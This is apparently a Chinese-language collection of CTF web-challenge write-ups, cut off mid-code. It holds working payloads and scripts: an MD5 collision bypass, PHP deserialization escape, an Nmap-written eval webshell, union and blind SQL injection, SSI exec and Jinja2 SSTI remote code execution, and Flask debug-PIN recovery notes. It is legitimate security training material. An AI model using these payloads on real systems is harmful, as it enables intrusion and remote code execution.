(preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo(\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } ?\u0026gt; 这里要md5强比较绕过只能找payload了\n1 2 3 4 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 或者 a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 [MRCTF2020]PYWebsite [安洵杯 2019]easy_serialize_php 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php $function = @$_GET[\u0026#39;f\u0026#39;]; function filter($img){ $filter_arr = array(\u0026#39;php\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;php5\u0026#39;,\u0026#39;php4\u0026#39;,\u0026#39;fl1g\u0026#39;); $filter = \u0026#39;/\u0026#39;.implode(\u0026#39;|\u0026#39;,$filter_arr).\u0026#39;/i\u0026#39;; return preg_replace($filter,\u0026#39;\u0026#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\u0026#34;user\u0026#34;] = \u0026#39;guest\u0026#39;; $_SESSION[\u0026#39;function\u0026#39;] = $function; extract($_POST); if(!$function){ echo \u0026#39;\u0026lt;a href=\u0026#34;index.php?f=highlight_file\u0026#34;\u0026gt;source_code\u0026lt;/a\u0026gt;\u0026#39;; } if(!$_GET[\u0026#39;img_path\u0026#39;]){ $_SESSION[\u0026#39;img\u0026#39;] = base64_encode(\u0026#39;guest_img.png\u0026#39;); }else{ $_SESSION[\u0026#39;img\u0026#39;] = sha1(base64_encode($_GET[\u0026#39;img_path\u0026#39;])); } $serialize_info = filter(serialize($_SESSION)); if($function == \u0026#39;highlight_file\u0026#39;){ highlight_file(\u0026#39;index.php\u0026#39;); }else if($function == \u0026#39;phpinfo\u0026#39;){ eval(\u0026#39;phpinfo();\u0026#39;); //maybe you can find something in here! }else if($function == \u0026#39;show_image\u0026#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[\u0026#39;img\u0026#39;])); } 代码逻辑是extract传入变量，改变session[img]为固定值，序列化session然后过滤，反序列化，base64解码读取内容\n先看看phpinfo,找到d0g3_f1ag.php\nphp反序列化字符逃逸 在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，但如果我们在序列化字符串后加随机字符串\n1 2 3 4 \u0026lt;?php $str=\u0026#39;a:2:{i:0;s:8:\u0026#34;Hed9eh0g\u0026#34;;i:1;s:5:\u0026#34;aaaaa\u0026#34;;}abc\u0026#39;; var_dump(unserialize($str)); ?\u0026gt; 任然输出原来的结果,因为他读到}就停止了，不会读取}后的字符串\n1 2 3 4 5 6 7 8 \u0026lt;?php $_SESSION[\u0026#34;user\u0026#34;]=\u0026#39;flagflagflagflagflagflag\u0026#39;; $_SESSION[\u0026#34;function\u0026#34;]=\u0026#39;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#39;; $_SESSION[\u0026#34;img\u0026#34;]=\u0026#39;L2QwZzNfZmxsbGxsbGFn\u0026#39;; echo serialize($_SESSION); ?\u0026gt; //a:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;flagflagflagflagflagflag\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} 这里的function里面开头的\u0026quot;a是为了序列化之后跟前面的\u0026quot;拼接\n然后因为flag会被空替换，变成\n1 a:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} 本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，那么它将会尝试向后读取24个字符看看是否满足序列化的规则，也即读取;s:8:\u0026quot;function\u0026quot;;s:59:\u0026quot;a,读取这24个字符后以\u0026quot;;结尾，恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则\n最终结果为\n1 2 3 4 5 array(3) { [\u0026#34;user\u0026#34;]=\u0026gt; string(24) \u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34; [\u0026#34;img\u0026#34;]=\u0026gt; string(20) \u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34; [\u0026#34;dd\u0026#34;]=\u0026gt; string(1) \u0026#34;a\u0026#34; } 这样就把原来不可变的Img给替换了\n然后我们传入一个session让他序列化就行了,有两种绕过办法，第一种让__SESSION[flagflag]传入开头为\u0026quot;的字符串，这样序列化，就会拼接为空造成上面的绕过（不知道为什么复现不了）\n1 2 3 4 5 $_SESSION[\u0026#39;flagflag\u0026#39;]=\u0026#39;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#39;; #结果 a:1:{s:8:\u0026#34;flagflag\u0026#34;;s:51:\u0026#34;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#34;;}，这里就造成img不成为一个键，也就无法进行加密 #过滤掉flag有 #a:1:{s:8:\u0026#34;\u0026#34;;s:51:\u0026#34;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#34;;} #使得绕过;s:51:\u0026#34;\u0026#34;到达下一个分号，这时img成功逃逸出来 第二种直接构造三个session,然后在第一个session的值传很多flag,过滤后就会匹配后面的session来替换img\n1 2 3 _SESSION[a]=phpflagflagflagflagflagflagflagflagflagflagflagflagflag\u0026amp;_SESSION[img]=1\u0026amp;_SESSION[exp]=;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;i:0;i:1;} 序列化后 \u0026#34;a:3:{s:1:\u0026#34;a\u0026#34;;s:55:\u0026#34;\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;Z3Vlc3RfaW1nLnBuZw==\u0026#34;;s:3:\u0026#34;exp\u0026#34;;s:40:\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;i:0;i:1;}\u0026#34;;}\u0026#34; payload\n1 _SESSION[user]=flagflagflagflagflagphp\u0026amp;_SESSION[function]=\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:1:\u0026#34;2\u0026#34;;} [强网杯 2019]高明的黑客 用脚本筛选\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 import os import re import time import threading import requests from tqdm import tqdm thread_ = threading.Semaphore(30) # 设置最大线程数 ,别设置太大，不然还是会崩的 requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接 session = requests.Session() session.keep_alive = False # 设置连接活跃状态为False buu_url = \u0026#34;http://35a34fe5-7916-4ebf-a7ff-bfd82fe9bd4a.node4.buuoj.cn:81\u0026#34; filePath = r\u0026#34;D:\\Downloads\\src\u0026#34; os.chdir(filePath) files = os.listdir(filePath) flags = [] rrGET = re.compile(r\u0026#34;\\$_GET\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) # 匹配get参数 rrPOST = re.compile(r\u0026#34;\\$_POST\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) # 匹配post参数 def getflag(file): print(\u0026#34;[+]checking file:%s\u0026#34; % (file)) thread_.acquire() url = buu_url + \u0026#34;/\u0026#34; + file with open(file, encoding=\u0026#39;utf-8\u0026#39;) as f: gets = list(rrGET.findall(f.read())) posts = list(rrPOST.findall(f.read())) for g in gets: print(\u0026#34;[++]checking %s\u0026#34; % (g)) time.sleep(0.02) res = session.get(url + \u0026#34;?%s=%s\u0026#34; % (g, \u0026#34;echo ------\u0026#34;)) if \u0026#34;------\u0026#34; in res.text: flag = \u0026#34;fileName=%s, param=%s\u0026#34; % (file, g) flags.append(flag) for p in posts: print(\u0026#34;[++]checking %s\u0026#34; % (p)) res = session.post(url, data={p:\u0026#34;echo ------\u0026#34;}) if \u0026#34;------\u0026#34; in res.text: flag = \u0026#34;fileName=%s, param=%s\u0026#34; % (file, g) flags.append(flag) thread_.release() if __name__ == \u0026#39;__main__\u0026#39;: start_time = time.time() thread_list = [] for file in tqdm(files): t = threading.Thread(target=getflag, args=(file,)) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() print(flags) end_time = time.time() print(\u0026#34;[end]程序结束:用时(秒):\u0026#34;+str(end_time-start_time)) 最后参数为\n1 /xk0SzyKwfzw.php?Efa5BVG=cat /flag [网鼎杯 2020 朱雀组]Nmap 题目叫nmap想到之前的一道题online tool用-oG参数写入木马，用单引号加空格绕过\n1 \u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.php \u0026#39; 回显hacker，可能匹配了后缀名php\n1 \u0026#39; \u0026lt;?= @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.phtml \u0026#39; 回显hostmaybedown\n加上ip\n1 127.0.0.1 |\u0026#39; \u0026lt;?= @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.phtml \u0026#39; 上传后蚁剑连接\n解法二用-iL参数读取文件\n1 127.0.0.1 |\u0026#39; -iL /flag -o 1 \u0026#39; 因为注释里面有提示flag在根目录\n这样再访问1就得到flag\n[NPUCTF2020]ReadlezPHP 反序列化，过滤system，用assert查看phpinfo\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php class HelloPhp { public $a=\u0026#39;phpinfo()\u0026#39;; public $b=\u0026#39;assert\u0026#39;; public function __destruct(){ $a = $this-\u0026gt;a; $b = $this-\u0026gt;b; echo $b($a); } } $c = new HelloPhp(); echo serialize($c); 查找flag就有了\n[SWPU2019]Web1 sql注入过滤了or和空格和注释，用/**/绕过\n1 2 3 4 -1\u0026#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=\u0026#34;web1\u0026#34;\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 无列名注入 如果information_schema被WAF,得到表名之后使用无列名注入技巧获取字段值.\n1 select 1,2,3 union select * from 测试 之后就可以利用数字来对应相应的列,进行查询\n1 select `2` from (select 1,2,3 union select * from 测试) as test 1、列名需要用``包裹起来\n2、使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)\n如果反引号``被过滤,可以使用为字段起别名的方式.\n1 select b from (select 1,2 as b,3 union select * from 测试) as test [极客大挑战 2019]FinalSQL 盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests import time url = \u0026#34;http://5045a2b7-44b5-44ee-99d1-9db358afe49c.node5.buuoj.cn:81/search.php?\u0026#34; temp = {\u0026#34;id\u0026#34;: \u0026#34;\u0026#34;} column = \u0026#34;\u0026#34; for i in range(1, 1000): time.sleep(0.06) low = 32 high = 128 mid = (low + high) // 2 while (low \u0026lt; high): # 库名 #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))\u0026gt;%d)^1\u0026#34; % (i, mid) # 表名 #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) # 字段名 #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;F1naI1y\u0026#39;)),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) # 内容 temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) r = requests.get(url, params=temp) time.sleep(0.04) print(low, high, mid, \u0026#34;:\u0026#34;) if \u0026#34;Click\u0026#34; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 127): break column += chr(mid) print(column) print(\u0026#34;All:\u0026#34;, column) [CISCN 2019 初赛]Love Math 这里黑名单过滤了不少东西，常规的cat/flag都不能使用了，这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat/flag’);\n1 ?c=($_GET[a])($_GET[b])\u0026amp;a=system\u0026amp;b=cat /flag 但是这里的_GET和a，b都不是白名单里面的，这里需要替换\n1 ?c=($_GET[pi])($_GET[abs])\u0026amp;pi=system\u0026amp;abs=cat /flag 但是这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了\nhex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。\n但是hex2bin()函数也不是白名单里面的，而且这里的5f 47 45 54也不能直接填入,会被过滤\n这里的hex2bin()函数可以通过base_convert()函数来进行转换\nbase_convert()函数能够在任意进制之间转换数字\n这里的hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin\nhex2bin=base_convert(37907361743,10,36)\n然后里面的5f 47 45 54要用dechex()函数将10进制数转换为16进制的数\ndechex(1598506324)，1598506324转换为16进制就是5f 47 45 54\n1 2 payload /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})\u0026amp;pi=system\u0026amp;abs=cat /flag [极客大挑战 2019]RCE ME 上传webshell，蚁剑连接,正则用取反绕过\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php error_reporting(0); $a=\u0026#39;assert\u0026#39;; $b=urlencode(~$a); echo $b; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $c=\u0026#39;(eval($_POST[cmd]))\u0026#39;; $d=urlencode(~$c); echo $d; ?\u0026gt; 两个参数要用（）隔开\n由于命令执行参数被过滤了，用蚁剑插件绕过\n直接/readflag\n[De1CTF 2019]SSRF Me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #! /usr/bin/env python # #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip):\t#是一个简单的赋值函数 self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)):\t#如果没有该文件夹，则创立一个文件夹 os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) #注意w，可以对result.txt文件进行修改 resp = scan(self.param) if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp)\t#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中 tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;)\t#打开方式为只读 result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read()\t#读取result.txt中的数据 if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\t#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程 def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;))\t#cookie传递action参数，对应不同的处理方式 param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;))\t#传递get方式的参数param sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;))\t#cookie传递sign参数sign ip = request.remote_addr\t#获取请求端的ip地址 if(waf(param)):\t#调用waf函数进行过滤 return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) #创建Task类对象 return json.dumps(task.Exec())\t#以json的形式返回到客户端 @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;,\u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50]\t#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫 except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param):\t#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值 return hashlib.md5(secert_key + param + action).hexdigest() def md5(content):\t#将传入的字符串进行md5加密 return hashlib.md5(content).hexdigest() def waf(param):\t#防火墙的作用是判断开头的几个字母是否是gopher 或者是file 如果是的话，返回true check=param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=9999) /geneSign路由下面会调用getsign函数，跟进会有MD5哈希， return hashlib.md5(secert_key + param + action).hexdigest(),我们传入flag.txtread就会被拼接为secert_key+flag.txt+read+scan,然后就满足下面将flag.txt写入result.txt，然后再读取result.txt，/geneSign路由会回显hash,然后我们在/De1ta路由下面的cookie传入符合条件的值，就能读取result.txt\nhash:0ffa43c8b41c61f35e5f10c15ee8a3e6\n[BJDCTF2020]EasySearch 目录扫描扫出index.php.swp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start(); function get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; password的md5hash要是6d0bc1,写脚本爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import hashlib import threading string=\u0026#39;0123456789\u0026#39; class BF(threading.Thread): def __init__(self,left,right): threading.Thread.__init__(self) self.left=left self.right=right def run(self): admin=\u0026#39;6d0bc1\u0026#39; for i in range(self.left,self.right): s=hashlib.md5(str(i).encode(\u0026#39;utf8\u0026#39;)).hexdigest() if s[:6]==admin: print(i) threads=[] thread_count=5 for i in range(thread_count): threads.append(BF(i*2000000,(i+1)*2000000)) for t in threads: t.start() t.join() 2020666 2305004 9162671\n登入成功后会在public路由下面写入shtml文件\n接下来就用到\nApache SSI 远程命令执行漏洞（SSI注入漏洞） 当目标服务器开启了SSI与CGI支持，我们就可以上传shtml，利用\u0026lt;!--#exec cmd=\u0026quot;ls /\u0026quot; --\u0026gt;语法来执行命令。\n使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为\u0026quot;服务器端嵌入\u0026quot;或者叫\u0026quot;服务器端包含\u0026quot;，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。\n我们先bp查看信息，找到前下的shtml，回显用户名\n可以在用户名处注入\n1 2 \u0026lt;!--#exec cmd=\u0026#34;ls ../\u0026#34; --\u0026gt; \u0026lt;!--#exec cmd=\u0026#34;cat /flag\u0026#34; --\u0026gt; 这里找到flag_990c66bf85a09c664f0b6741840499b2\n[GYCTF2020]FlaskApp 先用非预期解\n字符串拼接绕过，或者倒序输出绕过\n1 2 3 查看app.py {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;app.py\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 过滤了flag和os等函数和关键词。 1 {{\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__imp\u0026#39;+\u0026#39;ort__\u0026#39;](\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).listdir(\u0026#39;/\u0026#39;)}} 1 2 将字符倒转输出 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;txt.galf_eht_si_siht/\u0026#39;[::-1],\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 1 2 字符串拼接 {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == \u0026#39;catch_warnings\u0026#39; %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if \u0026#39;eva\u0026#39;+\u0026#39;l\u0026#39; in b.keys() %} {{ b[\u0026#39;eva\u0026#39;+\u0026#39;l\u0026#39;](\u0026#39;__impor\u0026#39;+\u0026#39;t__\u0026#39;+\u0026#39;(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;)\u0026#39;+\u0026#39;.pope\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;(\u0026#34;cat /this_is_the_fl\u0026#39;+\u0026#39;ag.txt\u0026#34;).read()\u0026#39;) }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 预期解\npython的flask模板注入debug模式利用PIN码进行RCE 生成PIN的关键值有如下几个\n1、服务器运行flask所登录的用户名。 通过读取/etc/passwd获得 2、modname 一般不变就是flask.app 3、getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变 4、flask库下app.py的绝对路径。通过报错信息就会泄露该值。 5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address获得 //eth0处为当前使用的网卡 6、最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id\n下面开始操作\n通过随便报错回显app.py位置\n1 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;app.py\u0026#39;,\u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 发现waf\n1 2 **def waf(str): black_list 